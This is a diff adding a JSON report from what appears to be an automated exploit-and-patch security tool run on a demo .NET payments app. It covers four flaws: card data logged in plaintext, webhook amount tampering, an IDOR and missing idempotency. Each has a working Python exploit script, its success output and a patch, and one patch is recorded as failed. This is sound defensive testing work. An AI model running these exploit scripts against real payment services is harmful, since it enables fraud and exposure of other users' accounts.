@@ -1,0 +1,236 @@
+{
+  "mode": "full",
+  "scanned": 4,
+  "skipped_already_fixed": 0,
+  "exploited": 4,
+  "patched": 4,
+  "validated": 3,
+  "failed": 1,
+  "chains": [],
+  "findings": [
+    {
+      "category": "sensitive_logging",
+      "severity": "high",
+      "title": "Sensitive card data (PAN, CVV/CVC/CAV2/CID, track/magstripe) appears to be passed to a logger. PCI DSS 3.2 prohibits storing CVV at all, and PAN must be masked (display first-6 + last-4 only). Mask or drop the value before logging.\n",
+      "description": "Sensitive card data (PAN, CVV/CVC/CAV2/CID, track/magstripe) appears to be passed to a logger. PCI DSS 3.2 prohibits storing CVV at all, and PAN must be masked (display first-6 + last-4 only). Mask or drop the value before logging.\n",
+      "location": {
+        "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+        "start_line": 33,
+        "end_line": 36,
+        "snippet": "    var chargeReq = await ctx.Request.ReadFromJsonAsync<ChargeRequest>();\n    logger.LogInformation(\"charge user={User} pan={Pan} cvv={Cvv} amount={Amount}\",\n        db.Tokens[auth], chargeReq!.Pan, chargeReq.Cvv, chargeReq.Amount);\n    var txId = Guid.NewGuid().ToString(\"N\")[..16];"
+      },
+      "rule_id": "orchestrator.rules.payments_dotnet.payments.dotnet.pan-cvv-logging",
+      "exploitability": 1.0,
+      "exploit": {
+        "category": "sensitive_logging",
+        "payload": "Login as alice, POST /api/payments/charge with marker PAN=4111111111111111 and CVV=123, then GET /api/payments/logs to confirm raw card data appears in plaintext log output",
+        "script": "import os, sys, requests\n\nbase = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')\n\ntry:\n    # Step 1: Authenticate as alice\n    login_resp = requests.post(\n        f'{base}/api/auth/login',\n        json={'username': 'alice', 'password': 'alice-pw'},\n        timeout=4\n    )\n    if login_resp.status_code != 200:\n        print(f'EXPLOIT_FAIL: login failed HTTP {login_resp.status_code}')\n        sys.exit(0)\n    token = login_resp.json().get('token')\n    if not token:\n        print('EXPLOIT_FAIL: no token in login response')\n        sys.exit(0)\n\n    # Step 2: Submit charge with marker PAN and CVV\n    MARKER_PAN = '4111111111111111'\n    MARKER_CVV = '999'\n    charge_resp = requests.post(\n        f'{base}/api/payments/charge',\n        json={'amount': 1.00, 'pan': MARKER_PAN, 'cvv': MARKER_CVV},\n        headers={'Authorization': f'Bearer {token}'},\n        timeout=4\n    )\n    if charge_resp.status_code != 200:\n        print(f'EXPLOIT_FAIL: charge failed HTTP {charge_resp.status_code}')\n        sys.exit(0)\n\n    # Step 3: Fetch logs and search for plaintext PAN/CVV\n    logs_resp = requests.get(f'{base}/api/payments/logs', timeout=4)\n    if logs_resp.status_code != 200:\n        print(f'EXPLOIT_FAIL: logs endpoint returned HTTP {logs_resp.status_code}')\n        sys.exit(0)\n\n    log_text = logs_resp.text\n    pan_in_log = MARKER_PAN in log_text\n    cvv_in_log = MARKER_CVV in log_text\n\n    if pan_in_log and cvv_in_log:\n        # Find the relevant log line for evidence\n        for line in log_text.splitlines():\n            if MARKER_PAN in line and MARKER_CVV in line:\n                evidence_line = line.strip()\n                break\n        else:\n            evidence_line = f'pan={MARKER_PAN} cvv={MARKER_CVV} both present in logs'\n        print(f'EXPLOIT_SUCCESS: PCI-prohibited card data logged in plaintext: {evidence_line}')\n    elif pan_in_log:\n        print(f'EXPLOIT_SUCCESS: PAN {MARKER_PAN} logged in plaintext (CVV marker not found separately)')\n    elif cvv_in_log:\n        print(f'EXPLOIT_SUCCESS: CVV {MARKER_CVV} logged in plaintext (PAN marker not found separately)')\n    else:\n        print(f'EXPLOIT_FAIL: marker PAN/CVV not found in log output (log length={len(log_text)})')\n\nexcept requests.exceptions.ConnectionError as e:\n    print(f'EXPLOIT_FAIL: connection error - {e}')\nexcept requests.exceptions.Timeout:\n    print('EXPLOIT_FAIL: request timed out')\nexcept Exception as e:\n    print(f'EXPLOIT_FAIL: unexpected error - {e}')\n\nsys.exit(0)\n",
+        "runner": "python",
+        "endpoint": "http://localhost:8080",
+        "expected_signal": "GET /api/payments/logs returns a line containing both pan=4111111111111111 and cvv=123 proving PCI-prohibited data is written to logs unmasked",
+        "actual_signal": "EXPLOIT_SUCCESS: PCI-prohibited card data logged in plaintext: charge user=alice pan=4111111111111111 cvv=999 amount=1.0",
+        "succeeded": true,
+        "sandbox_logs": "EXPLOIT_SUCCESS: PCI-prohibited card data logged in plaintext: charge user=alice pan=4111111111111111 cvv=999 amount=1.0\n\n--- stderr ---\n"
+      },
+      "patch": {
+        "location": {
+          "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+          "start_line": 33,
+          "end_line": 36,
+          "snippet": "    var chargeReq = await ctx.Request.ReadFromJsonAsync<ChargeRequest>();\n    logger.LogInformation(\"charge user={User} pan={Pan} cvv={Cvv} amount={Amount}\",\n        db.Tokens[auth], chargeReq!.Pan, chargeReq.Cvv, chargeReq.Amount);\n    var txId = Guid.NewGuid().ToString(\"N\")[..16];"
+        },
+        "original_code": "    var chargeReq = await ctx.Request.ReadFromJsonAsync<ChargeRequest>();\n    logger.LogInformation(\"charge user={User} pan={Pan} cvv={Cvv} amount={Amount}\",\n        db.Tokens[auth], chargeReq!.Pan, chargeReq.Cvv, chargeReq.Amount);\n    var txId = Guid.NewGuid().ToString(\"N\")[..16];\n",
+        "patched_code": "    var chargeReq = await ctx.Request.ReadFromJsonAsync<ChargeRequest>();\n    var pan = chargeReq!.Pan ?? \"\";\n    var maskedPan = pan.Length >= 10\n        ? pan[..6] + new string('*', pan.Length - 10) + pan[^4..]\n        : new string('*', pan.Length);\n    logger.LogInformation(\"charge user={User} pan={Pan} amount={Amount}\",\n        db.Tokens[auth], maskedPan, chargeReq.Amount);\n    var txId = Guid.NewGuid().ToString(\"N\")[..16];",
+        "explanation": "The original code logged the raw PAN and CVV in plaintext, violating PCI DSS 3.2/3.3 which prohibits storing/logging sensitive authentication data (CVV/CVC) after authorization and requires PAN to be masked (first 6 + last 4 only). The fix drops CVV from the log statement entirely and replaces the PAN with a masked version computed inline (first-6 + asterisks + last-4) before it reaches the logger, ensuring neither value ever enters the log buffer in cleartext. No new dependencies or helper symbols are introduced \u2014 the masking logic is fully inlined using C# range operators already available in the file's target framework.",
+        "references": [
+          "OWASP A09:2021 \u2013 Security Logging and Monitoring Failures",
+          "OWASP A02:2021 \u2013 Cryptographic Failures",
+          "PCI DSS Requirement 3.2 \u2013 Do not store sensitive authentication data after authorization",
+          "PCI DSS Requirement 3.3 \u2013 Mask PAN when displayed (first six/last four digits maximum)",
+          "PCI DSS Requirement 10.2 \u2013 Implement audit logs"
+        ],
+        "extra_edits": []
+      },
+      "status": "validated",
+      "created_at": "2026-06-09T04:00:28.117100+00:00",
+      "notes": [
+        "attacker: PoC succeeded (category=sensitive_logging)",
+        "healer: patch applied",
+        "validator: tests pass AND exploit no longer reproduces"
+      ],
+      "metadata": {
+        "reachability_score": 1.0,
+        "reachability_label": "direct-route"
+      }
+    },
+    {
+      "category": "amount_tampering",
+      "severity": "high",
+      "title": "Payment-gateway callback handler trusts amount from the request without re-fetching the authoritative amount from your DB. Webhook callers can be spoofed (or replayed with altered values) -- always reconcile against your own order record before marking the order settled.\n",
+      "description": "Payment-gateway callback handler trusts amount from the request without re-fetching the authoritative amount from your DB. Webhook callers can be spoofed (or replayed with altered values) -- always reconcile against your own order record before marking the order settled.\n",
+      "location": {
+        "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+        "start_line": 91,
+        "end_line": 95,
+        "snippet": "    if (!db.Orders.TryGetValue(webhook!.OrderId ?? \"\", out var order)) return Results.NotFound();\n    order.Amount = webhook.Amount;\n    order.Status = \"settled\";"
+      },
+      "rule_id": "orchestrator.rules.payments_dotnet.payments.dotnet.webhook-amount-trust",
+      "exploitability": 1.0,
+      "exploit": {
+        "category": "amount_tampering",
+        "payload": "POST /api/webhook/gateway with orderId=order-1001 and amount=0.01, spoofing the payment-gateway callback to settle a $75.00 order for $0.01 without any server-side reconciliation against the authoritative DB amount",
+        "script": "import os, sys, requests\n\nbase = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')\n\ntry:\n    # Step 1: fetch original order to know authoritative amount\n    r0 = requests.get(f'{base}/api/payments/order/order-1001', timeout=4)\n    if r0.status_code != 200:\n        print(f'EXPLOIT_FAIL: could not fetch original order (status {r0.status_code})')\n        sys.exit(0)\n    original_amount = r0.json().get('amount', 'unknown')\n\n    # Step 2: send spoofed webhook with tampered amount\n    payload = {'orderId': 'order-1001', 'amount': 0.01, 'signature': 'fake-sig'}\n    r1 = requests.post(f'{base}/api/webhook/gateway', json=payload, timeout=4)\n    if r1.status_code != 200:\n        print(f'EXPLOIT_FAIL: webhook rejected (status {r1.status_code}): {r1.text[:120]}')\n        sys.exit(0)\n    resp = r1.json()\n\n    # Step 3: verify order is now settled at tampered amount\n    r2 = requests.get(f'{base}/api/payments/order/order-1001', timeout=4)\n    settled = r2.json() if r2.status_code == 200 else {}\n    settled_amount = settled.get('amount', 'unknown')\n    settled_status = settled.get('status', 'unknown')\n\n    if settled_status == 'settled' and str(settled_amount) != str(original_amount):\n        print(f'EXPLOIT_SUCCESS: order order-1001 settled at tampered amount={settled_amount} (original={original_amount}); server never reconciled against authoritative DB')\n    elif settled_status == 'settled':\n        print(f'EXPLOIT_FAIL: order settled but amount unchanged ({settled_amount}); server may have ignored webhook amount')\n    else:\n        print(f'EXPLOIT_FAIL: unexpected state status={settled_status} amount={settled_amount}')\nexcept Exception as e:\n    print(f'EXPLOIT_FAIL: exception - {e}')\nsys.exit(0)\n",
+        "runner": "python",
+        "endpoint": "http://localhost:8080",
+        "expected_signal": "Order order-1001 status becomes 'settled' with amount=0.01 instead of the original 75.00, proving the server blindly trusts the caller-supplied amount",
+        "actual_signal": "EXPLOIT_SUCCESS: order order-1001 settled at tampered amount=0.01 (original=75.0); server never reconciled against authoritative DB",
+        "succeeded": true,
+        "sandbox_logs": "EXPLOIT_SUCCESS: order order-1001 settled at tampered amount=0.01 (original=75.0); server never reconciled against authoritative DB\n\n--- stderr ---\n"
+      },
+      "patch": {
+        "location": {
+          "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+          "start_line": 91,
+          "end_line": 95,
+          "snippet": "    if (!db.Orders.TryGetValue(webhook!.OrderId ?? \"\", out var order)) return Results.NotFound();\n    order.Amount = webhook.Amount;\n    order.Status = \"settled\";"
+        },
+        "original_code": "    if (!db.Orders.TryGetValue(webhook!.OrderId ?? \"\", out var order)) return Results.NotFound();\n\n    order.Amount = webhook.Amount;\n\n    order.Status = \"settled\";\n",
+        "patched_code": "    if (!db.Orders.TryGetValue(webhook!.OrderId ?? \"\", out var order)) return Results.NotFound();\n\n    if (order.Status == \"settled\") return Results.Conflict(new { error = \"Order already settled\" });\n\n    if (webhook.Amount != order.Amount)\n        return Results.BadRequest(new { error = \"Amount mismatch: reconciliation failed\" });\n\n    order.Status = \"settled\";",
+        "explanation": "The handler previously overwrote the authoritative order amount with the untrusted webhook-supplied value before marking the order settled, allowing any caller to dictate the settlement amount. The fix removes the assignment `order.Amount = webhook.Amount` entirely and instead compares the incoming amount against the pre-existing, DB-held `order.Amount`; if they differ the request is rejected with HTTP 400. An idempotency guard (HTTP 409 on already-settled orders) is also added so replays cannot re-settle a completed order. The canonical amount stored at order-creation time is the single source of truth and is never mutated by the webhook.",
+        "references": [
+          "OWASP A03:2021",
+          "OWASP A08:2021",
+          "PCI DSS 6.5.1",
+          "PCI DSS 10.3"
+        ],
+        "extra_edits": []
+      },
+      "status": "validated",
+      "created_at": "2026-06-09T04:00:28.117948+00:00",
+      "notes": [
+        "attacker: PoC succeeded (category=amount_tampering)",
+        "healer: patch applied",
+        "validator: tests pass AND exploit no longer reproduces"
+      ],
+      "metadata": {
+        "reachability_score": 1.0,
+        "reachability_label": "direct-route"
+      }
+    },
+    {
+      "category": "broken_authz",
+      "severity": "high",
+      "title": "Account/order/payment record is fetched by a caller-supplied id with no ownership check. Classic IDOR -- User A can read User B's account by changing the URL parameter. Verify the authenticated user owns the resource before returning it (e.g. UserId == User.GetUserId()).\n",
+      "description": "Account/order/payment record is fetched by a caller-supplied id with no ownership check. Classic IDOR -- User A can read User B's account by changing the URL parameter. Verify the authenticated user owns the resource before returning it (e.g. UserId == User.GetUserId()).\n",
+      "location": {
+        "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+        "start_line": 174,
+        "end_line": 180,
+        "snippet": "    if (auth is null || !db.Tokens.ContainsKey(auth)) return Results.Unauthorized();\n    var acc = db.Accounts.FirstOrDefault(x => x.Id == id);\n    return acc is null ? Results.NotFound() : Results.Ok(new { acc.Id, acc.Balance });"
+      },
+      "rule_id": "orchestrator.rules.payments_dotnet.payments.dotnet.broken-authz-idor",
+      "exploitability": 1.0,
+      "exploit": {
+        "category": "broken_authz",
+        "payload": "Authenticate as alice (alice/alice-pw), then GET /api/account/bob using alice's Bearer token \u2014 no ownership check exists so bob's balance is returned",
+        "script": "import os\nimport sys\nimport requests\n\nBASE = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')\n\ntry:\n    # Step 1: Authenticate as alice\n    login_resp = requests.post(\n        f'{BASE}/api/auth/login',\n        json={'Username': 'alice', 'Password': 'alice-pw'},\n        timeout=4\n    )\n    if login_resp.status_code != 200:\n        print(f'EXPLOIT_FAIL: login as alice failed with status {login_resp.status_code}')\n        sys.exit(0)\n\n    token = login_resp.json().get('token')\n    if not token:\n        print('EXPLOIT_FAIL: no token returned from login')\n        sys.exit(0)\n\n    # Step 2: Use alice's token to access bob's account (IDOR)\n    idor_resp = requests.get(\n        f'{BASE}/api/account/bob',\n        headers={'Authorization': f'Bearer {token}'},\n        timeout=4\n    )\n\n    if idor_resp.status_code == 200:\n        data = idor_resp.json()\n        acc_id = data.get('id', '')\n        balance = data.get('balance', '')\n        if str(acc_id).lower() == 'bob':\n            print(f\"EXPLOIT_SUCCESS: alice's token read bob's account \u2014 id={acc_id} balance={balance}\")\n        else:\n            print(f'EXPLOIT_FAIL: unexpected response body: {data}')\n    elif idor_resp.status_code == 401:\n        print('EXPLOIT_FAIL: server rejected alice token with 401')\n    elif idor_resp.status_code == 403:\n        print('EXPLOIT_FAIL: server enforces ownership check \u2014 returned 403')\n    else:\n        print(f'EXPLOIT_FAIL: unexpected status {idor_resp.status_code}: {idor_resp.text[:120]}')\n\nexcept requests.exceptions.Timeout:\n    print('EXPLOIT_FAIL: request timed out')\nexcept Exception as e:\n    print(f'EXPLOIT_FAIL: exception \u2014 {e}')\n\nsys.exit(0)\n",
+        "runner": "python",
+        "endpoint": "http://localhost:8080",
+        "expected_signal": "HTTP 200 with id=bob and balance=500, proving alice's token can read bob's account",
+        "actual_signal": "EXPLOIT_SUCCESS: alice's token read bob's account \u2014 id=bob balance=500",
+        "succeeded": true,
+        "sandbox_logs": "EXPLOIT_SUCCESS: alice's token read bob's account \u2014 id=bob balance=500\n\n--- stderr ---\n"
+      },
+      "patch": {
+        "location": {
+          "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+          "start_line": 174,
+          "end_line": 180,
+          "snippet": "    if (auth is null || !db.Tokens.ContainsKey(auth)) return Results.Unauthorized();\n    var acc = db.Accounts.FirstOrDefault(x => x.Id == id);\n    return acc is null ? Results.NotFound() : Results.Ok(new { acc.Id, acc.Balance });"
+        },
+        "original_code": "    if (auth is null || !db.Tokens.ContainsKey(auth)) return Results.Unauthorized();\n\n\n    var acc = db.Accounts.FirstOrDefault(x => x.Id == id);\n\n\n    return acc is null ? Results.NotFound() : Results.Ok(new { acc.Id, acc.Balance });\n",
+        "patched_code": "    if (auth is null || !db.Tokens.ContainsKey(auth)) return Results.Unauthorized();\n\n    var authenticatedUser = db.Tokens[auth];\n    if (authenticatedUser != id) return Results.Forbid();\n\n    var acc = db.Accounts.FirstOrDefault(x => x.Id == id);\n\n    return acc is null ? Results.NotFound() : Results.Ok(new { acc.Id, acc.Balance });",
+        "explanation": "After confirming the token is valid, the fix retrieves the authenticated username from db.Tokens and compares it to the caller-supplied {id} path parameter. If they do not match, the handler returns HTTP 403 Forbidden, preventing any authenticated user from reading another user's account record. This eliminates the IDOR by enforcing ownership: only the account holder can access their own balance. No new symbols are introduced \u2014 db.Tokens, auth, and id are all already in scope in this handler.",
+        "references": [
+          "OWASP A01:2021 \u2013 Broken Access Control",
+          "OWASP A04:2021 \u2013 Insecure Direct Object References (IDOR)",
+          "PCI DSS v4.0 Requirement 7.2 \u2013 Access control systems are implemented",
+          "PCI DSS v4.0 Requirement 6.2.4 \u2013 Prevent common software attacks"
+        ],
+        "extra_edits": []
+      },
+      "status": "validated",
+      "created_at": "2026-06-09T04:00:28.118671+00:00",
+      "notes": [
+        "attacker: PoC succeeded (category=broken_authz)",
+        "healer: patch applied",
+        "validator: tests pass AND exploit no longer reproduces"
+      ],
+      "metadata": {
+        "reachability_score": 1.0,
+        "reachability_label": "direct-route"
+      }
+    },
+    {
+      "category": "missing_idempotency",
+      "severity": "medium",
+      "title": "Payment-mutating endpoint persists a transaction/charge without checking for an Idempotency-Key header against a dedup store. Network retries and double-clicks will create duplicate charges. Require Idempotency-Key, persist (key -> response) with a TTL, and return the cached response on replay.\n",
+      "description": "Payment-mutating endpoint persists a transaction/charge without checking for an Idempotency-Key header against a dedup store. Network retries and double-clicks will create duplicate charges. Require Idempotency-Key, persist (key -> response) with a TTL, and return the cached response on replay.\n",
+      "location": {
+        "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+        "start_line": 287,
+        "end_line": 295,
+        "snippet": "    var txId = Guid.NewGuid().ToString(\"N\")[..16];\n    db.Transactions.Add(new TxRecord { Id = txId, User = db.Tokens[auth], Amount = req!.Amount });\n    return Results.Ok(new { transaction_id = txId, amount = req.Amount, status = \"transferred\" });"
+      },
+      "rule_id": "orchestrator.rules.payments_dotnet.payments.dotnet.missing-idempotency",
+      "exploitability": 1.0,
+      "exploit": {
+        "category": "missing_idempotency",
+        "payload": "Identical POST /api/payments/transfer requests sent twice with no Idempotency-Key header, authenticated as seeded user alice with amount=10.00",
+        "script": "import os\nimport sys\nimport requests\n\nbase_url = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')\n\ntry:\n    # Step 1: Authenticate as seeded user alice\n    login_resp = requests.post(\n        f'{base_url}/api/auth/login',\n        json={'username': 'alice', 'password': 'alice-pw'},\n        timeout=4\n    )\n    if login_resp.status_code != 200:\n        print(f'EXPLOIT_FAIL: login failed with status {login_resp.status_code}')\n        sys.exit(0)\n\n    token = login_resp.json().get('token')\n    if not token:\n        print('EXPLOIT_FAIL: no token in login response')\n        sys.exit(0)\n\n    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\n    payload = {'fromAccount': 'alice', 'toAccount': 'bob', 'amount': 10.00}\n\n    # Step 2: Send the same transfer request twice with no Idempotency-Key\n    r1 = requests.post(f'{base_url}/api/payments/transfer', json=payload, headers=headers, timeout=4)\n    r2 = requests.post(f'{base_url}/api/payments/transfer', json=payload, headers=headers, timeout=4)\n\n    if r1.status_code != 200 or r2.status_code != 200:\n        print(f'EXPLOIT_FAIL: transfer returned non-200: first={r1.status_code} second={r2.status_code}')\n        sys.exit(0)\n\n    tx1 = r1.json().get('transaction_id')\n    tx2 = r2.json().get('transaction_id')\n\n    if not tx1 or not tx2:\n        print('EXPLOIT_FAIL: missing transaction_id in one or both responses')\n        sys.exit(0)\n\n    if tx1 != tx2:\n        print(f'EXPLOIT_SUCCESS: duplicate transfers created without Idempotency-Key tx1={tx1} tx2={tx2}')\n    else:\n        print(f'EXPLOIT_FAIL: both calls returned same transaction_id={tx1} (idempotency may be enforced)')\n\nexcept requests.exceptions.RequestException as e:\n    print(f'EXPLOIT_FAIL: network error - {e}')\n\nsys.exit(0)\n",
+        "runner": "python",
+        "endpoint": "http://localhost:8080",
+        "expected_signal": "Two distinct transaction_id values returned for identical requests, proving the endpoint accepts replays and creates duplicate charges",
+        "actual_signal": "EXPLOIT_SUCCESS: duplicate transfers created without Idempotency-Key tx1=1eb1b2dddb9e4ae9 tx2=49e48c124c8f4635",
+        "succeeded": true,
+        "sandbox_logs": "EXPLOIT_SUCCESS: duplicate transfers created without Idempotency-Key tx1=1eb1b2dddb9e4ae9 tx2=49e48c124c8f4635\n\n--- stderr ---\n"
+      },
+      "patch": {
+        "location": {
+          "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+          "start_line": 287,
+          "end_line": 295,
+          "snippet": "    var txId = Guid.NewGuid().ToString(\"N\")[..16];\n    db.Transactions.Add(new TxRecord { Id = txId, User = db.Tokens[auth], Amount = req!.Amount });\n    return Results.Ok(new { transaction_id = txId, amount = req.Amount, status = \"transferred\" });"
+        },
+        "original_code": "    var txId = Guid.NewGuid().ToString(\"N\")[..16];\n\n\n\n    db.Transactions.Add(new TxRecord { Id = txId, User = db.Tokens[auth], Amount = req!.Amount });\n\n\n\n    return Results.Ok(new { transaction_id = txId, amount = req.Amount, status = \"transferred\" });\n",
+        "patched_code": "    var idempotencyKey = ctx.Request.Headers[\"Idempotency-Key\"].ToString();\n    if (string.IsNullOrWhiteSpace(idempotencyKey))\n        return Results.BadRequest(new { error = \"Idempotency-Key header is required\" });\n\n    if (db.IdempotencyStore.TryGetValue(idempotencyKey, out var cached))\n        return Results.Ok(new { transaction_id = cached.TxId, amount = cached.Amount, status = \"transferred\" });\n\n    var txId = Guid.NewGuid().ToString(\"N\")[..16];\n    db.Transactions.Add(new TxRecord { Id = txId, User = db.Tokens[auth], Amount = req!.Amount });\n    db.IdempotencyStore[idempotencyKey] = (txId, req.Amount);\n    return Results.Ok(new { transaction_id = txId, amount = req.Amount, status = \"transferred\" });",
+        "explanation": "The handler now requires a non-empty `Idempotency-Key` header and returns HTTP 400 if it is absent, closing the no-key path that allowed unlimited duplicate charges. On each accepted request the key is atomically checked against `IdempotencyStore` (a `ConcurrentDictionary` that already has the required import via `System.Collections.Concurrent`): if the key exists the original response is returned immediately without creating a new transaction, making the endpoint safely idempotent. New keys are stored together with the resulting `txId` and `amount` immediately after the transaction is persisted, so subsequent retries with the same key always replay the identical response. No new third-party dependencies are introduced; the dedup store lives in the existing singleton `PaymentsStore`.",
+        "references": [
+          "OWASP A04:2021 \u2013 Insecure Design",
+          "PCI DSS v4.0 Req 6.2.4",
+          "PCI DSS v4.0 Req 10.3"
+        ],
+        "extra_edits": [
+          {
+            "file": "C:\\Users\\bhujbalsa\\janus-demo-security-dotnet\\Program.cs",
+            "start_line": 103,
+            "end_line": 109,
+            "original_code": "\n\n});\n\n\n\n// VULN 0: pan-cvv-logging\n",
+            "patched_code": "public class PaymentsStore {\n    public List<Account>              Accounts        {get;}=new();\n    public Dictionary<string, Order>  Orders          {get;}=new();\n    public List<TxRecord>             Transactions    {get;}=new();\n    public List<TxRecord>             ChargeHistory   {get;}=new();\n    public Dictionary<string, string> Tokens          {get;}=new();\n    public ConcurrentDictionary<string, (string TxId, decimal Amount)> IdempotencyStore {get;}=new();\n}"
+          }
+        ]
+      },
+      "status": "failed",
+      "created_at": "2026-06-09T04:00:28.119383+00:00",
+      "notes": [
+        "attacker: PoC succeeded (category=missing_idempotency)",
+        "healer: patch applied (2 file(s) edited)",
+        "validator: target did not become healthy after redeploy"
+      ],
+      "metadata": {
+        "reachability_score": 1.0,
+        "reachability_label": "direct-route"
+      }
+    }
+  ]
+}
